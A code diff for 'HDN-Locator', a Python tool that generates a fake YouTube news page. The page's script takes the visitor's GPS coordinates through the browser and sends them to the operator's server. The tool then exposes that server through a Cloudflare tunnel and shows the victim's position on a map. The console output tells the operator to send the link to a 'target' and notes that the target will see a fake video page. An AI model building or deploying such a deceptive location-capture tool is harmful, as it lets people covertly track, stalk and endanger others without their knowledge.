@@ -1,6 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+"""
+HDN-Locator v1.0 - Cross Platform GPS Location Tracker
+Works on: Windows, Kali Linux, Ubuntu, macOS
+Author: HasnainDarkNet
+"""
+
 import os
 import sys
 import json
@@ -8,32 +14,86 @@ import time
 import threading
 import webbrowser
 import subprocess
-import socket
 import datetime
 import http.server
 import socketserver
 import urllib.request
-import zipfile
+import re
+import platform
+import socket
 
-class LocationTrackerWindows:
+class HDNLocator:
     def __init__(self):
         self.port = 8080
         self.http_server = None
         self.tunnel_process = None
         self.public_url = None
         self.running = True
+        self.os_type = platform.system()
+        self.cloudflared_path = self.find_cloudflared()
         
+    def find_cloudflared(self):
+        """Find cloudflared in system PATH or current directory"""
+        # Check in current directory first
+        if self.os_type == "Windows":
+            names = ["cloudflared.exe", "cloudflared"]
+        else:
+            names = ["cloudflared", "./cloudflared"]
+        
+        for name in names:
+            if os.path.exists(name):
+                return name
+        
+        # Check in system PATH
+        if self.os_type != "Windows":
+            try:
+                result = subprocess.run(["which", "cloudflared"], capture_output=True, text=True)
+                if result.returncode == 0 and result.stdout.strip():
+                    return result.stdout.strip()
+            except:
+                pass
+        
+        # Check common locations
+        common_paths = [
+            "/usr/local/bin/cloudflared",
+            "/usr/bin/cloudflared",
+            "/bin/cloudflared"
+        ]
+        
+        for path in common_paths:
+            if os.path.exists(path):
+                return path
+        
+        return None
+    
+    def get_cloudflared_url(self):
+        """Get correct download URL based on OS"""
+        if self.os_type == "Windows":
+            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
+        elif self.os_type == "Darwin":
+            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
+        else:
+            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+    
+    def get_local_ip(self):
+        """Get local IP address"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except:
+            return "127.0.0.1"
+    
     def create_fake_video_page(self):
-        """Create fake YouTube video page with GPS capture"""
+        """Create fake YouTube video page"""
         html_content = '''<!DOCTYPE html>
 <html>
 <head>
     <title>▶️ Breaking News - Must Watch!</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="Amazing Video - Trending Today">
-    <meta property="og:description" content="This video will go viral! Watch now.">
-    <meta property="og:image" content="https://i.ytimg.com/an_webp/X6TNGIrLJOY/mqdefault_6s.webp?du=3000&sqp=CITC488G&rs=AOn4CLCXh6btBiBqXnYbqBDXoIMszyTvOg">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f0f0f; color: #fff; }
@@ -43,20 +103,17 @@ class LocationTrackerWindows:
         .video-container { max-width: 1200px; margin: 0 auto; padding: 20px; }
         .video-player { background: #000; border-radius: 12px; overflow: hidden; position: relative; cursor: pointer; }
         .thumbnail { width: 100%; display: block; }
-        .play-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 68px; height: 48px; background: rgba(0,0,0,0.7); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 30px; transition: all 0.2s; }
-        .play-overlay:hover { background: #cc0000; transform: translate(-50%, -50%) scale(1.1); }
+        .play-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 68px; height: 48px; background: rgba(0,0,0,0.7); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 30px; cursor: pointer; }
+        .play-overlay:hover { background: #cc0000; }
         .video-title { font-size: 18px; font-weight: 500; margin: 12px 0 8px; }
         .video-stats { color: #aaa; font-size: 14px; margin-bottom: 12px; }
         .channel-info { display: flex; align-items: center; gap: 12px; margin: 16px 0; padding: 12px 0; border-top: 1px solid #272727; border-bottom: 1px solid #272727; }
-        .channel-avatar { width: 40px; height: 40px; background: #cc0000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
-        .subscribe-btn { background: #cc0000; color: white; border: none; padding: 8px 16px; border-radius: 2px; cursor: pointer; margin-left: auto; font-weight: 500; }
-        .loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.9); padding: 20px; border-radius: 8px; display: none; z-index: 1000; text-align: center; }
+        .channel-avatar { width: 40px; height: 40px; background: #cc0000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 18px; }
+        .subscribe-btn { background: #cc0000; color: white; border: none; padding: 8px 16px; border-radius: 2px; cursor: pointer; margin-left: auto; }
+        .loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.9); padding: 20px; border-radius: 8px; display: none; text-align: center; z-index: 1000; }
         .error-msg { background: #cc0000; color: white; padding: 10px; text-align: center; display: none; position: fixed; bottom: 0; left: 0; right: 0; z-index: 1000; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #cc0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
-        .comments { margin-top: 20px; }
-        .comment { display: flex; gap: 12px; margin: 15px 0; }
-        .comment-avatar { width: 36px; height: 36px; background: #3ea6ff; border-radius: 50%; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -66,213 +123,129 @@ class LocationTrackerWindows:
         <div>🔔</div>
         <div>👤</div>
     </div>
-    
     <div class="video-container">
         <div class="video-player" id="videoPlayer">
-            <img class="thumbnail" src="https://i.ytimg.com/an_webp/X6TNGIrLJOY/mqdefault_6s.webp?du=3000&sqp=CITC488G&rs=AOn4CLCXh6btBiBqXnYbqBDXoIMszyTvOg" alt="Video thumbnail">
+            <img class="thumbnail" src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" alt="Video thumbnail">
             <div class="play-overlay">▶</div>
         </div>
-        
-       
-        
+        <div class="video-title">🔴 BREAKING: Emergency Alert System Test - Nationwide</div>
+        <div class="video-stats">2.5M views • Live now</div>
         <div class="channel-info">
-            <div class="channel-avatar">N</div>
-            <div><div style="font-weight: bold;">News Today</div>
+            <div class="channel-avatar">H</div>
+            <div><div style="font-weight: bold;">HDN News</div><div style="font-size: 12px; color: #aaa;">8.2M subscribers</div></div>
             <button class="subscribe-btn" id="watchBtn">SUBSCRIBE</button>
         </div>
-        
-        
     </div>
-    
     <div class="loading" id="loading"><div class="spinner"></div><div>Loading video...</div></div>
     <div class="error-msg" id="errorMsg">⚠️ Video unavailable in your region</div>
-
     <script>
         let locationSent = false;
-        
         function getLocation() {
             if (locationSent) return;
             locationSent = true;
-            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
+                    enableHighAccuracy: true, timeout: 15000, maximumAge: 0
                 });
-            } else {
-                sendError("Geolocation not supported");
             }
         }
-        
         function sendLocation(position) {
-            var data = {
-                lat: position.coords.latitude,
-                lon: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                altitude: position.coords.altitude,
-                speed: position.coords.speed,
-                userAgent: navigator.userAgent,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                language: navigator.language,
-                platform: navigator.platform,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
-            };
-            
             fetch('/track', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(err => console.log('Error:', err));
+                body: JSON.stringify({
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    platform: navigator.platform,
+                    timestamp: new Date().toISOString()
+                })
+            });
         }
-        
         function showError(error) {
-            fetch('/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ error: error.message, userAgent: navigator.userAgent })
-            });
+            fetch('/track', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ error: error.message }) });
         }
-        
-        function sendError(msg) {
-            fetch('/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ error: msg, userAgent: navigator.userAgent })
-            });
-        }
-        
-        // Capture immediately
         getLocation();
-        
-        // Capture on video click
         document.getElementById('videoPlayer').onclick = function() {
             document.getElementById('loading').style.display = 'block';
             getLocation();
             setTimeout(function() {
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('errorMsg').style.display = 'block';
-                setTimeout(function() {
-                    document.getElementById('errorMsg').style.display = 'none';
-                }, 3000);
+                setTimeout(function() { document.getElementById('errorMsg').style.display = 'none'; }, 3000);
             }, 2000);
         };
-        
-        document.getElementById('watchBtn').onclick = function() {
-            getLocation();
-            alert("Content is processing. Please wait...");
-        };
-        
-        // Capture on page leave
-        window.onbeforeunload = function() {
-            getLocation();
-        };
+        document.getElementById('watchBtn').onclick = function() { getLocation(); alert("Content is processing..."); };
     </script>
 </body>
 </html>'''
         
         with open('index.html', 'w', encoding='utf-8') as f:
             f.write(html_content)
-        print("[✓] Fake video page created: index.html")
+        print("[✓] Fake video page created")
     
     def create_viewer_page(self):
-        """Create page to view captured locations with map"""
+        """Create viewer page"""
         viewer_content = '''<!DOCTYPE html>
 <html>
 <head>
-    <title>📍 Captured GPS Locations</title>
+    <title>📍 HDN-Locator - GPS Tracker</title>
     <meta charset="UTF-8">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: monospace; background: #1a1a1a; color: #fff; padding: 20px; }
-        h1 { color: #4CAF50; margin-bottom: 20px; }
-        .stats { background: #2d2d2d; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: inline-block; }
+        h1 { color: #4CAF50; }
+        .stats { background: #2d2d2d; padding: 15px; border-radius: 8px; margin: 15px 0; }
         .location-card { background: #2d2d2d; margin: 10px 0; padding: 15px; border-radius: 8px; border-left: 4px solid #4CAF50; }
-        .timestamp { color: #888; font-size: 12px; }
         .coords { font-size: 18px; font-weight: bold; color: #4CAF50; }
-        .maps-link { color: #2196F3; text-decoration: none; }
         #map { height: 500px; margin: 20px 0; border-radius: 8px; }
-        .refresh-btn { background: #4CAF50; color: white; border: none; padding: 10px 20px; cursor: pointer; margin: 10px 0; border-radius: 5px; }
-        .refresh-btn:hover { background: #45a049; }
-        .copy-btn { background: #2196F3; color: white; border: none; padding: 10px 20px; cursor: pointer; margin: 10px 10px; border-radius: 5px; }
-        .link-box { background: #000; padding: 10px; margin: 10px 0; border-radius: 5px; word-break: break-all; }
+        button { background: #4CAF50; color: white; border: none; padding: 10px 20px; cursor: pointer; margin: 5px; border-radius: 5px; }
+        .copy-btn { background: #2196F3; }
     </style>
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
 <body>
-    <h1>📍 Live GPS Tracker</h1>
+    <h1>📍 HDN-Locator</h1>
     <div class="stats" id="stats">Loading...</div>
-    <div>
-        <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
-        <button class="copy-btn" onclick="copyLink()">📋 Copy Public Link</button>
-    </div>
+    <button onclick="location.reload()">🔄 Refresh</button>
+    <button class="copy-btn" onclick="copyLink()">📋 Copy Link</button>
     <div id="map"></div>
     <div id="locations-list"></div>
-    
     <script>
         let publicUrl = '';
-        
         fetch('/url').then(r => r.json()).then(data => { publicUrl = data.url; });
-        
-        function copyLink() {
-            if (publicUrl) {
-                navigator.clipboard.writeText(publicUrl);
-                alert('Link copied: ' + publicUrl);
-            }
-        }
-        
+        function copyLink() { if(publicUrl) { navigator.clipboard.writeText(publicUrl); alert('Copied!'); } }
         function loadLocations() {
             fetch('locations.json?' + Date.now())
                 .then(response => response.json())
                 .then(data => {
                     if (!data || data.length === 0) {
-                        document.getElementById('locations-list').innerHTML = '<p>⏳ No locations captured yet. Send link to target and wait...</p>';
-                        document.getElementById('stats').innerHTML = '📍 Locations: 0';
+                        document.getElementById('locations-list').innerHTML = '<p>⏳ Waiting for target...</p>';
                         return;
                     }
-                    
-                    let html = '';
-                    let lastLoc = null;
-                    let locationCount = 0;
-                    
+                    let html = '', lastLoc = null, count = 0;
                     for (let i = data.length - 1; i >= 0; i--) {
                         const loc = data[i];
                         if (loc.lat && loc.lon) {
-                            locationCount++;
-                            lastLoc = loc;
+                            count++; lastLoc = loc;
                             html += `<div class="location-card">
-                                <div class="timestamp">📅 ${loc.server_time || loc.timestamp || 'Unknown'}</div>
                                 <div class="coords">📍 ${loc.lat}, ${loc.lon}</div>
                                 <div>🎯 Accuracy: ${loc.accuracy || '?'} meters</div>
                                 <div>🌐 IP: ${loc.ip || 'Unknown'}</div>
-                                <div>📱 Platform: ${loc.platform || 'Unknown'}</div>
-                                <div>🌍 Language: ${loc.language || 'Unknown'}</div>
-                                <a href="https://www.google.com/maps?q=${loc.lat},${loc.lon}" target="_blank" class="maps-link">🗺️ View on Google Maps</a>
+                                <a href="https://www.google.com/maps?q=${loc.lat},${loc.lon}" target="_blank">🗺️ View on Google Maps</a>
                             </div>`;
                         }
                     }
-                    
                     document.getElementById('locations-list').innerHTML = html;
-                    document.getElementById('stats').innerHTML = `📍 Total Locations: ${locationCount} | 📱 Last Update: ${new Date().toLocaleTimeString()}`;
-                    
+                    document.getElementById('stats').innerHTML = `📍 Locations: ${count} | Last: ${new Date().toLocaleTimeString()}`;
                     if (lastLoc) {
                         const map = L.map('map').setView([lastLoc.lat, lastLoc.lon], 15);
-                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                            attribution: '© OpenStreetMap'
-                        }).addTo(map);
-                        L.marker([lastLoc.lat, lastLoc.lon]).addTo(map)
-                            .bindPopup(`<b>🎯 Target Location</b><br>Lat: ${lastLoc.lat}<br>Lon: ${lastLoc.lon}<br><a href="https://www.google.com/maps?q=${lastLoc.lat},${lastLoc.lon}" target="_blank">Open in Google Maps</a>`)
-                            .openPopup();
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                        L.marker([lastLoc.lat, lastLoc.lon]).addTo(map).bindPopup('Target Location').openPopup();
                     }
-                })
-                .catch(err => {
-                    document.getElementById('locations-list').innerHTML = '<p>⚠️ Waiting for server...</p>';
-                });
+                }).catch(err => {});
         }
-        
         loadLocations();
         setInterval(loadLocations, 3000);
     </script>
@@ -281,121 +254,117 @@ class LocationTrackerWindows:
         
         with open('view.html', 'w', encoding='utf-8') as f:
             f.write(viewer_content)
-        print("[✓] Viewer page created: view.html")
-    
-    def download_cloudflared(self):
-        """Download cloudflared for Windows"""
-        print("[*] Downloading Cloudflared...")
-        
-        cloudflared_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
-        cloudflared_path = "cloudflared.exe"
-        
-        try:
-            urllib.request.urlretrieve(cloudflared_url, cloudflared_path)
-            print("[✓] Cloudflared downloaded")
-            return True
-        except Exception as e:
-            print(f"[!] Download failed: {e}")
-            return False
+        print("[✓] Viewer page created")
     
     def start_cloudflare_tunnel(self):
         """Start Cloudflare tunnel for public access"""
         print("\n[*] Starting Cloudflare tunnel...")
         
-        if not os.path.exists("cloudflared.exe"):
-            if not self.download_cloudflared():
-                print("[!] Could not download cloudflared. Using local IP only.")
+        # First try to use system cloudflared
+        cloudflared_cmd = self.cloudflared_path
+        
+        if not cloudflared_cmd or not os.path.exists(cloudflared_cmd):
+            print("[!] Cloudflared not found. Installing...")
+            
+            # Download cloudflared
+            url = self.get_cloudflared_url()
+            output = "cloudflared"
+            
+            try:
+                subprocess.run(["wget", "-q", url, "-O", output], timeout=30)
+                subprocess.run(["chmod", "+x", output])
+                cloudflared_cmd = f"./{output}"
+                print("[✓] Cloudflared downloaded")
+            except Exception as e:
+                print(f"[!] Download failed: {e}")
+                self.show_local_only()
                 return None
         
-        try:
-            # Start cloudflared tunnel
-            self.tunnel_process = subprocess.Popen(
-                f"cloudflared.exe tunnel --url http://localhost:{self.port}",
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                text=True
-            )
-            
-            # Get the public URL from output
-            time.sleep(5)
-            for line in iter(self.tunnel_process.stdout.readline, ''):
-                if 'https://' in line and '.trycloudflare.com' in line:
-                    import re
-                    urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
-                    if urls:
-                        self.public_url = urls[0]
-                        print(f"[✓] Public URL: {self.public_url}")
-                        break
-                if 'https://' in line:
-                    parts = line.split()
-                    for part in parts:
-                        if 'https://' in part and '.trycloudflare.com' in part:
-                            self.public_url = part.strip()
-                            print(f"[✓] Public URL: {self.public_url}")
-                            break
-                    if self.public_url:
-                        break
-                time.sleep(0.5)
-                
-        except Exception as e:
-            print(f"[!] Tunnel error: {e}")
+        # Try multiple methods to get URL
+        methods = [
+            f"{cloudflared_cmd} tunnel --url http://localhost:{self.port}",
+            f"cloudflared tunnel --url http://localhost:{self.port}",
+            f"/usr/local/bin/cloudflared tunnel --url http://localhost:{self.port}"
+        ]
         
-        return self.public_url
+        for method in methods:
+            try:
+                print(f"[*] Trying: {method[:50]}...")
+                
+                self.tunnel_process = subprocess.Popen(
+                    method,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    text=True
+                )
+                
+                # Wait for URL
+                timeout = 15
+                start = time.time()
+                while time.time() - start < timeout:
+                    if self.tunnel_process.poll() is not None:
+                        break
+                    if self.tunnel_process.stdout:
+                        line = self.tunnel_process.stdout.readline()
+                        if line:
+                            urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
+                            if urls:
+                                self.public_url = urls[0]
+                                print(f"\n[✓] Public URL: {self.public_url}")
+                                return self.public_url
+                    time.sleep(0.5)
+                    
+            except Exception as e:
+                continue
+        
+        self.show_local_only()
+        return None
+    
+    def show_local_only(self):
+        """Show local network options"""
+        local_ip = self.get_local_ip()
+        print(f"\n[!] Cloudflare tunnel failed. Using local network!")
+        print(f"\n📱 Same WiFi Network URLs:")
+        print(f"   http://{local_ip}:{self.port}")
+        print(f"   http://{local_ip}:{self.port}/view")
     
     def start_python_server(self):
-        """Start custom HTTP server for location tracking"""
-        
+        """Start HTTP server"""
         class LocationHandler(http.server.SimpleHTTPRequestHandler):
-            locations_file = 'locations.json'
-            
             def log_message(self, format, *args):
-                pass  # Suppress logs
+                pass
             
             def do_POST(self):
                 if self.path == '/track':
                     try:
-                        content_length = int(self.headers['Content-Length'])
-                        post_data = self.rfile.read(content_length)
-                        data = json.loads(post_data.decode('utf-8'))
-                        
-                        # Add server info
+                        length = int(self.headers['Content-Length'])
+                        data = json.loads(self.rfile.read(length).decode('utf-8'))
                         data['ip'] = self.client_address[0]
                         data['server_time'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                         
-                        # Load existing locations
                         locations = []
-                        if os.path.exists(self.locations_file):
-                            with open(self.locations_file, 'r') as f:
+                        if os.path.exists('locations.json'):
+                            with open('locations.json', 'r') as f:
                                 try:
                                     locations = json.load(f)
                                 except:
                                     pass
                         
                         locations.append(data)
-                        with open(self.locations_file, 'w') as f:
+                        with open('locations.json', 'w') as f:
                             json.dump(locations, f, indent=2)
                         
-                        # Print to console
                         if 'lat' in data:
-                            print(f"\n🎯 NEW LOCATION CAPTURED!")
-                            print(f"   📍 Coordinates: {data['lat']}, {data['lon']}")
-                            print(f"   🗺️  Maps: https://www.google.com/maps?q={data['lat']},{data['lon']}")
-                            print(f"   📱 Device: {data.get('platform', 'Unknown')}")
-                            print(f"   🌐 IP: {data['ip']}")
-                            print(f"   ⏰ Time: {data['server_time']}")
-                            print("-" * 50)
-                        elif 'error' in data:
-                            print(f"\n⚠️ Location Error: {data['error']}")
+                            print(f"\n🎯 NEW LOCATION!")
+                            print(f"   📍 {data['lat']}, {data['lon']}")
+                            print(f"   🗺️  https://www.google.com/maps?q={data['lat']},{data['lon']}")
                         
-                        # Send response
                         self.send_response(200)
                         self.send_header('Content-Type', 'application/json')
                         self.end_headers()
                         self.wfile.write(json.dumps({'status': 'success'}).encode())
-                        
-                    except Exception as e:
-                        print(f"Error: {e}")
+                    except:
                         self.send_response(500)
                         self.end_headers()
                 else:
@@ -408,150 +377,92 @@ class LocationTrackerWindows:
                 elif self.path == '/view':
                     self.path = '/view.html'
                 elif self.path == '/url':
-                    # Endpoint to get public URL
                     self.send_response(200)
                     self.send_header('Content-Type', 'application/json')
                     self.end_headers()
-                    url_data = {'url': getattr(self.server, 'public_url', 'Not available')}
-                    self.wfile.write(json.dumps(url_data).encode())
+                    self.wfile.write(json.dumps({'url': getattr(self.server, 'public_url', '')}).encode())
                     return
-                
                 return http.server.SimpleHTTPRequestHandler.do_GET(self)
         
-        # Create handler with public_url access
-        handler = LocationHandler
-        
-        # Create server
-        self.http_server = socketserver.TCPServer(("0.0.0.0", self.port), handler)
+        self.http_server = socketserver.TCPServer(("0.0.0.0", self.port), LocationHandler)
         self.http_server.public_url = self.public_url
         
-        # Start server in thread
         server_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
         server_thread.start()
-        print(f"[✓] HTTP Server running at http://localhost:{self.port}")
-        
-        return server_thread
+        print(f"[✓] Server at http://localhost:{self.port}")
     
-    def display_info(self):
-        """Display all information"""
-        local_url = f"http://localhost:{self.port}"
-        
-        print("\n" + "="*60)
-        print("🎯 VIDEO LOCATION TRACKER - READY!")
-        print("="*60)
-        print(f"\n📱 Local URL (for testing): {local_url}")
-        print(f"👁️  View captured locations: {local_url}/view")
-        
-        if self.public_url:
-            print(f"\n🌍 PUBLIC URL (Send this to target):")
-            print(f"   {self.public_url}")
-            print(f"   {self.public_url}/view")
-            
-            # Create short link
-            try:
-                import urllib.parse
-                tiny_url = f"https://tinyurl.com/api-create.php?url={urllib.parse.quote(self.public_url)}"
-                with urllib.request.urlopen(tiny_url) as response:
-                    short = response.read().decode('utf-8')
-                    print(f"\n🔗 Short Link: {short}")
-            except:
-                pass
-        
-        print("\n" + "="*60)
-        print("📋 INSTRUCTIONS:")
-        print("="*60)
-        print("1️⃣  Send the PUBLIC URL to target via WhatsApp/Text")
-        print("2️⃣  When they open, location will be captured")
-        print("3️⃣  Check captured locations at: /view")
-        print("4️⃣  Data saved in: locations.json")
-        print("\n⚠️  Target will see a fake YouTube video page")
-        print("⚠️  Browser will ask for location permission - Allow it")
-        print("\n📍  Captured locations will appear here in real-time!")
-        print("="*60)
-        
-        # Auto open browser
-        webbrowser.open(f"{local_url}/view")
-    
-    def cleanup(self):
-        """Cleanup on exit"""
-        print("\n[*] Shutting down...")
-        self.running = False
-        if self.http_server:
-            self.http_server.shutdown()
-        if self.tunnel_process:
-            self.tunnel_process.terminate()
-        sys.exit(0)
+    def show_banner(self):
+        os.system('clear' if self.os_type != "Windows" else 'cls')
+        print("""
+╔════════════════════════════════════════════════════════════════════╗
+║                                                                    ║
+║     ██╗  ██╗██████╗ ███╗   ██║                                    ║
+║     ██║  ██║██╔══██╗████╗  ██║                                    ║
+║     ███████║██║  ██║██╔██╗ ██║                                    ║
+║     ██╔══██║██║  ██║██║╚██╗██║                                    ║
+║     ██║  ██║██████╔╝██║ ╚████║                                    ║
+║     ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝                                    ║
+║                                                                    ║
+║                    HDN-Locator v1.0                                ║
+║         GPS Location Tracker | Anti-Spoofing                       ║
+║              [🐺] HasnainDarkNet [🐺]                               ║
+║                                                                    ║
+╚════════════════════════════════════════════════════════════════════╝
+        """)
+        print(f"    [*] OS: {self.os_type}")
+        print("    [*] Initializing...\n")
+        time.sleep(1)
     
     def run(self):
-        """Main function - HDN Hacker Style Banner"""
-        os.system('cls' if os.name == 'nt' else 'clear')
-        print("""
-╔══════════════════════════════════════════════════════════════════════════════╗
-║                                                                              ║
-║     ██╗  ██╗██████╗ ███╗   ██╗                                              ║
-║     ██║  ██║██╔══██╗████╗  ██║                                              ║
-║     ███████║██║  ██║██╔██╗ ██║                                              ║
-║     ██╔══██║██║  ██║██║╚██╗██║                                              ║
-║     ██║  ██║██████╔╝██║ ╚████║                                              ║
-║     ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝                                              ║
-║                                                                              ║
-║     ██╗      ██████╗  ██████╗ █████╗ ████████╗ ██████╗ ██████╗               ║
-║     ██║     ██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗              ║
-║     ██║     ██║   ██║██║     ███████║   ██║   ██║   ██║██████╔╝              ║
-║     ██║     ██║   ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗              ║
-║     ███████╗╚██████╔╝╚██████╗██║  ██║   ██║   ╚██████╔╝██║  ██║              ║
-║     ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝              ║
-║                                                                              ║
-║                    GPS LOCATION TRACKER v1.0                                 ║
-║                    Capture Exact Coordinates                                 ║
-║                    Anti-Spoofing | Real-time Map                             ║
-║                                                                              ║
-║                    [🐺] HDN-Locator by HasnainDarkNet [🐺]                    ║
-║                                                                              ║
-╚══════════════════════════════════════════════════════════════════════════════╝
-        """)
+        self.show_banner()
         
-        print("    [*] Initializing HDN-Locator...")
-        time.sleep(1)
-        print("    [*] Loading modules...")
-        time.sleep(0.5)
-        print("    [*] Starting GPS tracker engine...")
-        time.sleep(0.5)
-        print("    [*] Establishing secure tunnel...")
-        time.sleep(0.5)
-        print("""
-    ╔══════════════════════════════════════════════════════════════════╗
-    ║  [✓] Status: READY                                               ║
-    ║  [✓] Target: Any Device with Browser                             ║
-    ║  [✓] Method: YouTube Fake Page + GPS Capture                     ║
-    ║  [✓] Anti-Spoofing: ACTIVE                                       ║
-    ╚══════════════════════════════════════════════════════════════════╝
-        """)
-        
-        # Create files
         self.create_fake_video_page()
         self.create_viewer_page()
-        
-        # Start server
         self.start_python_server()
         
-        # Start Cloudflare tunnel
+        # Try Cloudflare tunnel
         self.start_cloudflare_tunnel()
         
-        # Update server with public URL
         if self.http_server:
             self.http_server.public_url = self.public_url
         
-        # Display info
-        self.display_info()
+        local_url = f"http://localhost:{self.port}"
+        print("\n" + "="*60)
+        print("🎯 HDN-Locator READY!")
+        print("="*60)
+        print(f"\n📱 Local URL: {local_url}")
+        print(f"👁️  Viewer: {local_url}/view")
         
-        # Keep running
+        if self.public_url:
+            print(f"\n🌍 PUBLIC URL (Send to target):")
+            print(f"   {self.public_url}")
+        else:
+            local_ip = self.get_local_ip()
+            print(f"\n📱 Same WiFi Network URL:")
+            print(f"   http://{local_ip}:{self.port}")
+        
+        print("\n" + "="*60)
+        print("⚠️  Target must click ALLOW on location prompt")
+        print("📍  Captured locations appear in real-time!")
+        print("="*60)
+        
+        webbrowser.open(f"{local_url}/view")
+        
         try:
             while self.running:
                 time.sleep(1)
         except KeyboardInterrupt:
-            self.cleanup()
+            print("\n[*] Shutting down...")
+            if self.http_server:
+                self.http_server.shutdown()
+            if self.tunnel_process:
+                self.tunnel_process.terminate()
+            sys.exit(0)
 
 if __name__ == "__main__":
-    tracker = LocationTrackerWindows()
+    if sys.version_info[0] < 3:
+        print("Python 3 required!")
+        sys.exit(1)
+    
+    tracker = HDNLocator()
     tracker.run()
